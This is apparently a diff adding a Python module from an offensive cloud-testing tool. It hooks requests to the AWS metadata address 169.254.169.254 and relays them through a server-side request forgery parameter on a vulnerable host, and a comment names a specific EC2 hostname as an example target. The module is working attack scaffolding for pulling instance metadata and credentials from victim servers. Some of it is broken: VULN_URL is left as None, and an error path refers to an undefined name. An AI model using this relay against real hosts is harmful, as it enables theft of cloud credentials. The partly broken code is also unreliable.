@@ -1,0 +1,51 @@
+import logging
+import re
+
+import requests
+import httpretty
+
+NOT_FOUND = '404 - Not Found'
+
+
+def mangle(method, uri, headers):
+    '''
+    See help at common_arguments.add_mangle_arguments to understand what this is.
+    '''
+    # 'http://ec2-54-254-24-239.ap-southeast-1.compute.amazonaws.com/?url=%s'
+    VULN_URL = None
+    
+    mangled_url = VULN_URL % uri
+    
+    logging.debug('Requesting %s' % mangled_url)
+    response = requests.get(mangled_url)
+    
+    code = 200
+    if NOT_FOUND in response.text:
+        code = 404
+        
+    return (code, headers, response.text)
+    
+def setup_mangle(cmd_args):
+    if cmd_args.mangle_function is not None:
+        # We need to verify that the user configured function exists
+        try:
+            mangle_module_funct = cmd_args.mangle_function
+            mangle_module = '.'.join(mangle_module_funct.split('.')[:-1])
+            mangle_funct = mangle_module_funct.split('.')[-1]
+            
+            _temp = __import__(mangle_module, globals(), locals(), ['mangle_funct'], -1)
+            mangle_funct = getattr(_temp, mangle_funct)
+        except:
+            msg = 'The user configured mangle function %s does not exist.'
+            logging.critical(msg % mangle_funct)
+        
+        # enable HTTPretty so that it will monkey patch the socket module
+        httpretty.enable()
+    
+        httpretty.register_uri(httpretty.GET,
+                               re.compile("http://169.254.169.254/(.*)"),
+                               body=mangle_funct)
+    
+def teardown_mangle():
+    if httpretty.is_enabled():
+        httpretty.disable()
